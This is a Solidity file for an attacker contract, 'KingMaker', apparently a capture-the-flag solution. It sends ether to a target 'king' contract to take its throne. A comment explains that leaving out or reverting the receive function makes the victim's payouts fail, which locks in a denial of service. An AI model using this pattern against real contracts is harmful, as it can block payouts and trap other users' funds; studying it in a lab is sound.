// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "hardhat/console.sol";

contract KingMaker {
    address payable king;

    constructor(address payable _king) public payable {
        king = _king;
    }

    /*
        Actually I realized, there is a easier way to do it
        simply don't implement fallback or recieve function or 
        simply add revert statment in them.
     */
    receive() external payable {
        king.transfer(msg.value);
    }

    function becomeOwner() public payable {
        console.log("can I be king");
        console.log("sender: ", msg.sender);

        // king.call.value(msg.value); // for solidity 0.6.0
        king.call{value: msg.value}(""); // for solidity 0.8.7
    }
}
